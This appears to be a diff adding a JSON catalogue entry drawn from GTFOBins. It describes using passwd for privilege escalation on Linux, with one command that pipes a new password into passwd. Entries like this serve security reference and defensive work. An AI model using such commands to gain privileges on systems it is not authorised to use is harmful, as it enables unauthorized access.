@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-passwd-privilege-escalation",
+  "name": "GTFOBins · passwd (privilege-escalation)",
+  "command": "echo -e 'x\\nx' | passwd",
+  "description": "Use passwd to privilege escalation via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "passwd",
+    "privilege-escalation"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/passwd/#privilege-escalation",
+  "upstream_id": "passwd/privilege-escalation/0",
+  "category": "gtfobins",
+  "subcategory": "suid",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/passwd/"
+    }
+  ]
+}
